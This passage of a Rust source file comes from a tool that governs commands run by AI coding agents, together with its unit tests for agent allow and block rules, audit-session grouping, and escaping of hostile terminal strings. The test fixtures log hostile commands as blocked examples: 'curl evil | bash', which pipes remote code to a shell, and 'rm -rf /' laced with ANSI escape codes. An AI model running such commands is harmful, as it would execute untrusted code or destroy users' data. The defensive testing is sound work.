            .and_then(|raw| {
                let s = tirith_core::agent_origin::sanitize_caller_version(&raw);
                (!s.is_empty()).then_some(s)
            });
    let ci_provider = tirith_core::agent_origin::detect_ci_provider();
    let ci_generic = std::env::var("CI")
        .map(|v| !v.trim().is_empty())
        .unwrap_or(false);
    // Report the raw `TIRITH_INTERACTIVE` value (not the resolved bool) so the
    // operator sees what they set; anything other than "0"/"1" is debug-escaped.
    let tirith_interactive_env = std::env::var("TIRITH_INTERACTIVE").ok().map(|v| {
        if v == "0" || v == "1" {
            v
        } else {
            format!("{v:?}")
        }
    });
    CurrentSignalsOwned {
        tirith_integration,
        tirith_integration_version,
        ci_provider,
        ci_generic,
        interactive,
        tirith_interactive_env,
    }
}

#[derive(serde::Serialize)]
struct CurrentSignalsOwned {
    #[serde(skip_serializing_if = "Option::is_none")]
    tirith_integration: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    tirith_integration_version: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    ci_provider: Option<String>,
    ci_generic: bool,
    interactive: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    tirith_interactive_env: Option<String>,
}

fn print_current_human(origin: &AgentOrigin, interactive: bool) {
    println!("kind: {}", origin.kind());
    match origin {
        AgentOrigin::Human { interactive: i } => {
            println!("interactive: {i}");
        }
        AgentOrigin::Agent { tool, version } => {
            println!("payload: {}", yaml_safe_scalar(tool));
            if let Some(v) = version {
                println!("version: {}", yaml_safe_scalar(v));
            }
        }
        AgentOrigin::Mcp {
            client_name,
            client_version,
        } => {
            println!("payload: {}", yaml_safe_scalar(client_name));
            if let Some(v) = client_version {
                println!("version: {}", yaml_safe_scalar(v));
            }
        }
        AgentOrigin::Gateway => {}
        AgentOrigin::Ci { provider } => {
            if let Some(p) = provider {
                println!("payload: {}", yaml_safe_scalar(p));
            } else {
                println!("payload: (generic CI)");
            }
        }
        AgentOrigin::Ide { name } => {
            println!("payload: {}", yaml_safe_scalar(name));
        }
    }
    println!();
    println!("signals:");
    if let Ok(raw) = std::env::var("TIRITH_INTEGRATION") {
        let sanitized = tirith_core::agent_origin::sanitize_caller_label(&raw);
        if !sanitized.is_empty() {
            println!("  TIRITH_INTEGRATION: {}", yaml_safe_scalar(&sanitized));
        }
    }
    if let Ok(raw) = std::env::var("TIRITH_INTEGRATION_VERSION") {
        let sanitized = tirith_core::agent_origin::sanitize_caller_version(&raw);
        if !sanitized.is_empty() {
            println!(
                "  TIRITH_INTEGRATION_VERSION: {}",
                yaml_safe_scalar(&sanitized)
            );
        }
    }
    if let Some(p) = tirith_core::agent_origin::detect_ci_provider() {
        println!("  CI provider: {p}");
    } else if std::env::var("CI").is_ok_and(|v| !v.trim().is_empty()) {
        println!("  CI: generic (no named provider env was set)");
    }
    println!("  interactive: {interactive}");
    println!();
    println!(
        "note: every signal above is caller-claimed (settable by any process \
running as the user). This report identifies an honest caller's category — \
it never authenticates a hostile one."
    );
}

// helpers — repo root, error reporting, YAML escaping

/// Resolve the repo root like `tirith policy init`: `.git`-boundary walk-up from
/// cwd, falling back to cwd.
fn find_repo_root_or_cwd() -> Result<PathBuf, String> {
    let cwd =
        std::env::current_dir().map_err(|e| format!("cannot determine working directory: {e}"))?;
    let cwd_str = cwd.display().to_string();
    Ok(policy::find_repo_root(Some(&cwd_str)).unwrap_or(cwd))
}

// Local alias for the shared YAML-scalar safety helper (consolidated from a copy
// formerly duplicated here and in `cli/mcp.rs`), keeping call sites terse.
use crate::cli::yaml::safe_scalar as yaml_safe_scalar;

fn report_error(json: bool, command: &str, message: &str) {
    if json {
        #[derive(serde::Serialize)]
        struct Err<'a> {
            schema_version: u32,
            error: &'a str,
        }
        let ctx = format!("{command}: failed to write JSON output");
        let _ = super::write_json_stdout(
            &Err {
                schema_version: 1,
                error: message,
            },
            &ctx,
        );
    } else {
        eprintln!("{command}: {message}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;
    use tirith_core::agent_origin::AgentOrigin;

    /// Write a verdict-shape audit line (matching `audit::log_verdict`'s
    /// `AuditEntry`) by hand rather than via `log_verdict`, so the test touches
    /// no process env vars / engine lock and controls timestamp ordering.
    fn plant_audit_line(
        log_path: &Path,
        timestamp: &str,
        session_id: &str,
        action: &str,
        rule_ids: &[&str],
        command: &str,
        origin: Option<&AgentOrigin>,
    ) {
        use std::io::Write;
        if let Some(parent) = log_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        let mut line = serde_json::json!({
            "timestamp": timestamp,
            "session_id": session_id,
            "action": action,
            "rule_ids": rule_ids,
            "command_redacted": command,
            "bypass_requested": false,
            "bypass_honored": false,
            "interactive": false,
            "tier_reached": 3,
            "entry_type": "verdict",
        });
        if let Some(o) = origin {
            line["agent_origin"] = serde_json::to_value(o).unwrap();
        }
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)
            .unwrap();
        writeln!(f, "{line}").unwrap();
    }

    /// Plant a synthetic hook-telemetry line. Used by the "sessions only
    /// counts verdicts" test to confirm filtering.
    fn plant_hook_telemetry_line(log_path: &Path, timestamp: &str, integration: &str) {
        use std::io::Write;
        if let Some(parent) = log_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        let line = serde_json::json!({
            "timestamp": timestamp,
            "session_id": "hk",
            "action": "hook",
            "rule_ids": [],
            "command_redacted": "",
            "bypass_requested": false,
            "bypass_honored": false,
            "interactive": false,
            "tier_reached": 0,
            "entry_type": "hook_telemetry",
            "event": "check_ok",
            "integration": integration,
            "hook_type": "pre_tool_use",
        });
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)
            .unwrap();
        writeln!(f, "{line}").unwrap();
    }

    // -----------------------------------------------------------------------
    // `agent block` — happy path
    // -----------------------------------------------------------------------

    /// A well-formed `(kind, name, pattern)` matcher is accepted (exit 0). The
    /// semantic-predicate flags were removed (M13 PR #132 round-28), so there is
    /// no predicate-rejection path here (the `cli_integration` test confirms
    /// they're now unknown clap args).
    #[test]
    fn block_with_valid_matcher_succeeds() {
        let rc = block("agent", Some("codex"), "sudo *", /* json = */ false);
        assert_eq!(
            rc, 0,
            "a block with a valid (kind, name, pattern) must succeed (exit 0)"
        );

        // `block` only writes to stdout + returns a code, so round-trip the
        // snippet it would emit (as `allow_snippet_round_trips_through_yaml` does).
        let matcher = AgentMatcher::new(AgentOriginKind::Agent, Some("codex".to_string()));
        let snippet = render_block_snippet(&matcher, "sudo *");

        // The pattern comment marker survives (round-28 removed only the flags).
        assert!(
            snippet.contains("# command pattern:"),
            "block snippet must still carry the pattern comment marker"
        );

        // The emitted matcher must carry EXACTLY kind + name (no predicate keys),
        // confirming the round-28 removal holds.
        let yaml = format!("agent_rules:\n  deny:\n{snippet}");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).expect("snippet parses");
        let entry = parsed
            .get("agent_rules")
            .and_then(|v| v.get("deny"))
            .and_then(|v| v.as_sequence())
            .and_then(|s| s.first())
            .and_then(|e| e.as_mapping())
            .expect("deny entry is a mapping");
        let keys: std::collections::BTreeSet<&str> =
            entry.keys().filter_map(|k| k.as_str()).collect();
        assert_eq!(
            keys,
            ["kind", "name"].into_iter().collect(),
            "block matcher must carry exactly kind + name (no semantic-predicate keys)"
        );
    }

    // -----------------------------------------------------------------------
    // sessions
    // -----------------------------------------------------------------------

    #[test]
    fn sessions_handles_missing_log_path() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("does-not-exist.jsonl");
        // Missing log is NOT an error — exits 0 with zero groups.
        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
        let code = sessions(Some(log.to_str().unwrap()), true);
        assert_eq!(code, 0);
    }

    #[test]
    fn sessions_groups_by_origin_kind_and_payload() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::agent("cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "echo hi2",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:02:00+00:00",
            "s3",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&cursor),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:03:00+00:00",
            "s4",
            "Allow",
            &[],
            "ls",
            None,
        );

        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn sessions_filters_to_verdict_entries_only() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        plant_hook_telemetry_line(&log, "2026-05-22T10:01:00+00:00", "claude-code");

        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0, "hook_telemetry rows must not break the read");
    }

    #[test]
    fn sessions_unattributed_entries_land_in_unknown_bucket() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "a",
            None,
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "b",
            None,
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:02:00+00:00",
            "s3",
            "Block",
            &[],
            "c",
            None,
        );

        let read = audit_aggregator::read_log(&log).unwrap();
        let mut groups: BTreeMap<OriginGroupKey, usize> = BTreeMap::new();
        for r in read
            .records
            .iter()
            .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
        {
            let key = OriginGroupKey::from_origin(r.agent_origin.as_ref());
            *groups.entry(key).or_insert(0) += 1;
        }
        assert_eq!(groups.len(), 1, "exactly one group: unknown");
        assert_eq!(groups.keys().next().unwrap().kind, "unknown");
    }

    #[test]
    fn sessions_json_format_outputs_structured_payload() {
        // Smoke the JSON branch via exit code (stdout capture is a subprocess
        // test the integration suite covers).
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let human = AgentOrigin::human(true);
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo",
            Some(&human),
        );
        let code = sessions(Some(log.to_str().unwrap()), true);
        assert_eq!(code, 0);
    }

    // -----------------------------------------------------------------------
    // explain
    // -----------------------------------------------------------------------

    #[test]
    fn explain_rejects_empty_query() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let code = explain("   ", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn explain_matches_by_command_substring() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "ls -la",
            Some(&AgentOrigin::human(true)),
        );
        let code = explain("curl", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_matches_by_session_id_exact() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "sess-abc123",
            "Allow",
            &[],
            "echo",
            None,
        );
        let code = explain("sess-abc123", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_matches_by_origin_label() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        let code = explain("claude-code", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_no_match_returns_one() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            None,
        );
        let code = explain("nonsense-query", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn explain_truncates_to_max_matches() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        for i in 0..(EXPLAIN_MAX_MATCHES + 5) {
            plant_audit_line(
                &log,
                &format!("2026-05-22T10:{:02}:00+00:00", i % 60),
                &format!("s{i}"),
                "Allow",
                &[],
                &format!("echo {i}"),
                Some(&claude),
            );
        }
        let code = explain("claude-code", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_missing_log_returns_one() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("nope.jsonl");
        let code = explain("anything", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    // human-output ANSI/CSI defense (Finding G): the formatters render
    // operator-trust JSONL-log strings through `{:?}` as defense-in-depth. These
    // tests feed hostile inputs and assert the output is printable-only (every
    // ESC/NUL/newline appears escaped, never raw).

    /// `true` if every byte is printable ASCII, tab, newline, or a UTF-8
    /// high byte — i.e. no bare ESC/NUL/C0/C1 the `{:?}` formatting should escape.
    fn is_printable_only(bytes: &[u8]) -> bool {
        for &b in bytes {
            // Allowed: printable ASCII, tab, formatter-emitted newline, or any
            // >= 0x80 (well-formed UTF-8 in a &str; `{:?}` neutralized C1).
            let ok = (0x20..=0x7E).contains(&b) || b == b'\t' || b == b'\n' || b >= 0x80;
            if !ok {
                return false;
            }
        }
        true
    }

    #[test]
    fn format_explain_match_debug_escapes_hostile_caller_strings() {
        // Hostile bytes in EVERY caller-controlled slot — simulating a row an
        // older tirith logged; the formatter is the defense-in-depth layer.
        let hostile_origin = AgentOrigin::Mcp {
            // Built directly (the `Mcp` constructor sanitizes) to simulate an
            // older-tirith log row; `{:?}` escapes it as `\u{1b}` etc.
            client_name: "evil\x1b[31mtool".to_string(),
            client_version: None,
        };
        let m = ExplainMatch {
            timestamp: "2026-05-22T\x1b[2J10:00:00".to_string(),
            session_id: "sess\x1b[31mabc".to_string(),
            action: "Bl\x1bock".to_string(),
            rule_ids: vec!["rule\x1b1".to_string(), "rule\x002".to_string()],
            command_redacted: "rm -rf\x1b[31m /".to_string(),
            bypass_requested: false,
            bypass_honored: false,
            agent_origin: Some(hostile_origin),
            policy_path: Some("/tmp/\x1b[31mevil.yaml".to_string()),
        };
        let rendered = format_explain_match(&m);
        assert!(
            !rendered.contains('\x1b'),
            "raw ESC must not reach the operator's terminal: {rendered:?}",
        );
        assert!(
            !rendered.contains('\x00'),
            "raw NUL must not reach the operator's terminal: {rendered:?}",
        );
        assert!(
            is_printable_only(rendered.as_bytes()),
            "format_explain_match must emit printable-only bytes: {rendered:?}",
        );
        // Cross-check that the operator can still see the *content* of the
        // hostile strings, escaped — `{:?}` renders ESC as `\u{1b}`.
        assert!(
            rendered.contains("\\u{1b}"),
            "Debug-escaped ESC must surface as `\\u{{1b}}`: {rendered:?}",
        );
    }

    #[test]
    fn format_session_group_debug_escapes_hostile_last_seen() {
        use std::collections::BTreeMap;
        let mut actions = BTreeMap::new();
        actions.insert("Allow".to_string(), 1);
        let g = SessionGroup {
            kind: "mcp".to_string(),
            // `label()` already `{:?}`-embeds this; the test confirms the
            // assembled bytes are clean.
            payload: Some("ev\x1b[31mil".to_string()),
            interactive: None,
            count: 1,
            last_seen: "2026\x1b[2J-05-22".to_string(),
            actions,
        };
        let rendered = format_session_group(&g);
        assert!(
            !rendered.contains('\x1b'),
            "raw ESC must not reach the operator's terminal: {rendered:?}",
        );
        assert!(
            is_printable_only(rendered.as_bytes()),
            "format_session_group must emit printable-only bytes: {rendered:?}",
        );
        assert!(
            rendered.contains("\\u{1b}"),
            "Debug-escaped ESC must surface as `\\u{{1b}}`: {rendered:?}",
        );
    }

    // -----------------------------------------------------------------------
    // policy_init
    // -----------------------------------------------------------------------

    #[test]
    fn policy_init_writes_header_only_scaffold_when_no_log() {
        let repo = tempdir().unwrap();
        let nonexistent = repo.path().join("never").join("audit.jsonl");
        let code = policy_init_for_root(
            repo.path(),
            Some(nonexistent.to_str().unwrap()),
            false,
            false,
        );
        assert_eq!(code, 0);
        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        let body = fs::read_to_string(&example_path).unwrap();
        assert!(body.contains("Tirith agent governance policy scaffold"));
        assert!(body.contains("No audit log was found"));
    }

    #[test]
    fn policy_init_lists_observed_origins() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::mcp("Cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo a",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&cursor),
        );

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let body = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();
        assert!(body.contains("claude-code"));
        assert!(body.contains("Cursor"));
        // Every entry is commented out — no bare `- kind:` lines outside a comment.
        for line in body.lines() {
            if line.trim_start().starts_with("- kind:") {
                panic!("uncommented entry leaked into scaffold: {line:?}");
            }
        }
    }

    #[test]
    fn policy_init_is_deterministic() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::agent("cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo a",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "echo b",
            Some(&cursor),
        );

        // First call: force=false, json=false (new file).
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let first = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();

        // Second call: force=true, json=false (overwrites and must produce identical bytes).
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), true, false);
        assert_eq!(code, 0);
        let second = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();
        assert_eq!(first, second, "byte-identical scaffold across re-runs");
    }

    #[test]
    fn policy_init_refuses_overwrite_without_force() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&AgentOrigin::human(true)),
        );

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 1, "second run without --force must refuse");
    }

    #[test]
    fn policy_init_overwrites_with_force() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&AgentOrigin::human(true)),
        );

        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        fs::create_dir_all(example_path.parent().unwrap()).unwrap();
        fs::write(&example_path, "SENTINEL").unwrap();

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), true, false);
        assert_eq!(code, 0);
        let body = fs::read_to_string(&example_path).unwrap();
        assert!(!body.contains("SENTINEL"));
    }

    #[test]
    fn policy_init_scaffold_yaml_survives_hostile_payload() {
        // A hostile tool name is escaped by yaml_safe_scalar: the YAML stays
        // parseable and no raw control byte reaches the terminal.
        let scaffold = AgentPolicyScaffold {
            audit_present: true,
            log_path: "/tmp/audit.jsonl".to_string(),
            origins: vec![ObservedOrigin {
                kind: "agent".to_string(),
                payload: Some("ev\x1b[31mil\nname".to_string()),
                interactive: None,
                count: 2,
            }],
        };
        let body = render_agent_policy_scaffold_yaml(&scaffold);
        for line in body.lines() {
            assert!(!line.contains('\x1b'), "ESC byte leaked: {line:?}");
        }
        // The escaped form is present (proves the payload reached the formatter).
        assert!(
            body.contains("\\u001b"),
            "escaped ESC must be present: {body}"
        );
    }

    /// M13 PR #132 round-23 F2: the scaffold header's `TIRITH=0`-bypass caveat
    /// must use EVERGREEN wording — no stale "revisit in M5" milestone reference.
    #[test]
    fn policy_init_scaffold_header_uses_evergreen_wording() {
        let scaffold = AgentPolicyScaffold {
            audit_present: false,
            log_path: "<unset>".to_string(),
            origins: vec![],
        };
        let body = render_agent_policy_scaffold_yaml(&scaffold);
        assert!(
            !body.contains("M5"),
            "scaffold header must not reference the M5 milestone: {body}"
        );
        assert!(
            body.contains("we plan\n# to revisit this in a future release."),
            "scaffold header must use the evergreen 'future release' wording: {body}"
        );
    }

    #[test]
    fn policy_init_json_format_outputs_structured_preview() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&claude),
        );
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, true);
        assert_eq!(code, 0);
        // The file is still on disk.
        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        assert!(example_path.is_file());
    }

    // -----------------------------------------------------------------------
    // allow
    // -----------------------------------------------------------------------

    #[test]
    fn allow_accepts_valid_agent_matcher_with_tool() {
        let code = allow("agent", Some("claude-code"), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_accepts_human_without_tool() {
        let code = allow("human", None, false);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_rejects_tool_on_human() {
        let code = allow("human", Some("anything"), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_tool_on_gateway() {
        let code = allow("gateway", Some("anything"), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_unknown_kind() {
        let code = allow("telepathy", None, false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_empty_tool_string() {
        let code = allow("agent", Some(""), false);
        assert_eq!(code, 1);
    }

    /// PR #120 fix-6 — `--tool "  claude-code  "` must sanitize through
    /// `sanitize_caller_label` so the emitted matcher matches the stored origin.
    #[test]
    fn tirith_agent_allow_normalizes_whitespace_payload() {
        // `allow` only returns an exit code, so pin the sanitizer directly; the
        // wiring is covered by `allow_accepts_whitespace_padded_tool`.
        let sanitized = tirith_core::agent_origin::sanitize_caller_label("  claude-code  ");
        assert_eq!(sanitized, "claude-code");
    }

    /// PR #120 fix-6 — a whitespace-padded tool sanitizes to "claude-code" and
    /// must exit 0, not be rejected as empty.
    #[test]
    fn allow_accepts_whitespace_padded_tool() {
        let code = allow("agent", Some("  claude-code  "), false);
        assert_eq!(
            code, 0,
            "--tool with surrounding whitespace must sanitize and succeed"
        );
    }

    /// PR #120 fix-6 — a whitespace-only tool sanitizes to "" and must hit the
    /// empty-string rejection arm.
    #[test]
    fn allow_rejects_whitespace_only_tool() {
        let code = allow("agent", Some("   "), false);
        assert_eq!(
            code, 1,
            "--tool of only whitespace sanitizes to empty and must reject"
        );
    }

    #[test]
    fn allow_snippet_round_trips_through_yaml() {
        // The emitted snippet must parse cleanly inside an agent_rules.allow
        // block (what the operator runs `tirith policy validate` against).
        let snippet = render_allow_snippet(&AgentMatcher {
            kind: AgentOriginKind::Agent,
            name: Some("claude-code".to_string()),
            ..Default::default()
        });
        let yaml = format!("agent_rules:\n  allow:\n{snippet}");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).expect("snippet parses");
        let kind = parsed
            .get("agent_rules")
            .and_then(|v| v.get("allow"))
            .and_then(|v| v.as_sequence())
            .and_then(|s| s.first())
            .and_then(|e| e.get("kind"))
            .and_then(|k| k.as_str());
        assert_eq!(kind, Some("agent"));
    }

    #[test]
    fn allow_snippet_quotes_hostile_payload() {
        // Hostile payload — ANSI escape, newline. Must be quoted-and-escaped.
        let snippet = render_allow_snippet(&AgentMatcher {
            kind: AgentOriginKind::Agent,
            name: Some("ev\x1b[31mil".to_string()),
            ..Default::default()
        });
        assert!(!snippet.contains('\x1b'));
        let yaml = format!("agent_rules:\n  allow:\n{snippet}");
        let _parsed: serde_yaml::Value =
            serde_yaml::from_str(&yaml).expect("hostile-payload snippet still parses");
    }

    #[test]
    fn allow_json_format_succeeds_for_valid_matcher() {
        let code = allow("agent", Some("claude-code"), true);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_json_format_returns_one_on_invalid_kind() {
        let code = allow("nonsense", None, true);
        assert_eq!(code, 1);
    }
}
